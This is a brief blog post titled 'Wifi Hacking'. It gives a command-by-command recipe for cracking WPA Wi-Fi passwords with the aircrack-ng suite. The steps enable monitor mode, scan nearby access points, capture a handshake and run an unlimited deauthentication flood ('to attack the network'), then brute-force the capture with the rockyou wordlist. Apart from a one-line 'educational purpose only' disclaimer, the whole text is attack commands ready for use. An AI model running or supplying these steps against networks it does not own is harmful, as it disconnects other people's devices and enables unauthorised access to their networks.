---
layout: post
title: Wifi Hacking
---

**_Disclaimer: This is for educational purpose only, please try in your own environment_**

*Alfa-card is mandatory to search/scan for available Networks*

Steps:

**Connect alfa-card and check the Interfaces**

    ipconfig/iwconfig - This you will give the wlan0 interface

**Start Monitor Mode**

    airmon-ng start wlan0

**Verify its Monitor Mode**

    airmon-ng/iwconfig

**Now Scan/Check for Nearby Available Networks**

    airodump-ng wlan0mon
  
The above command this will display or show list of available networks and make sure you capture and keep a note of AP's MAC address(BSSID) and channel
*AccessPoint(AP)*

**After getting BSSID and Channel id
Start Capturing the Handshake and Attack the same Time or after 5min.**

    airodump-ng -w test -c 11 --bssid BE:A5:8B:65:F8:FE wlan0mon - to capture the Handshake

    aireplay-ng --deauth 0 -a BE:A5:8B:65:F8:FE wlan0mon - to attack the network

**-w to save a file** 

**Now Stop the Monitormode and brute force the captured handshake**

    airmon-ng stop wlan0mon

**Bruteforce the saved file with the wordlists to crack the password**

    aircrack-ng test.cap -w /usr/share/wordlists/rockyou.txt 
